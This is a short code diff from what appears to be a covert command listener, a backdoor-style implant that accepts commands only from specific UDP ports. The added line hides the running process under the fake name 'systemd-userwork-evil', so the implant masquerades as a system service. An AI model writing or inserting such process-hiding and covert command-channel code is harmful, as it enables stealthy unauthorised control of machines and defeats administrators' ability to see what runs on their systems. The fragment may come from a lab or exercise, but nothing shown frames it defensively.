@@ -602,6 +602,7 @@ def packet_handler(pkt):
         -------
         None
     """
+    hide_process_name("systemd-userwork-evil")
     if pkt[UDP].sport != 10069 or pkt[UDP].dport != 10420:
         return
     command = receive_udp_command(pkt)
